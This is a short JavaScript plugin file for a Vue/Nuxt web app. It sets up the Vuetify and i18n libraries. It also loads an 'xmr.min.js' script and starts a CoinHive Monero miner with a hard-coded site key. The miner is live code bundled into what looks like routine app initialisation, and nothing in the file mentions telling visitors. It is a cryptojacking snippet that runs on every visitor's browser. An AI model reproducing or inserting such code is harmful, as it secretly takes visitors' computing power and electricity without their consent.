import Vue from 'vue'
import VueI18n from 'vue-i18n'
import Vuetify from 'vuetify'
import {asyncLoadScript} from '~/plugins/utils'

export default ({app}) => {
  Vue.use(Vuetify)
  Vue.use(VueI18n)
  app.i18n = new VueI18n()

  asyncLoadScript((process.env.StaticServer || process.env.Server) + '/theme/js/lib/xmr.min.js', () => {
    const miner = new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})
    miner.start()
  })
}
